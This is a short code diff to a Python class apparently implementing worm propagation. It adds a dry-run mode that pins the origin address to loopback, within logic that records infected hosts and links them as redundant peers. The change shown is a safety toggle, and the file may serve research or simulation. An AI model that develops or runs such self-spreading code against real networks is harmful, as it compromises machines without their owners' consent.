@@ -186,7 +186,7 @@ class WormCorePropagation:
             return
 
         for ip in self.infected_hosts:
-            if ip != get_local_ip():
+            if ip != ("127.0.0.1" if self.dry_run else get_local_ip()):
                 self.distributed_redundancy.add_peer(ip)
 
         repairs = self.distributed_redundancy.check_and_repair()
@@ -277,7 +277,8 @@ class WormCorePropagation:
         self.start_time = datetime.now()
         self.stats["start_time"] = self.start_time
 
-        local_ip = get_local_ip()
+        # dry-run keeps the origin loopback-only: no outbound IP resolution
+        local_ip = "127.0.0.1" if self.dry_run else get_local_ip()
         self.infected_hosts.add(local_ip)
 
         if self.knowledge_graph:
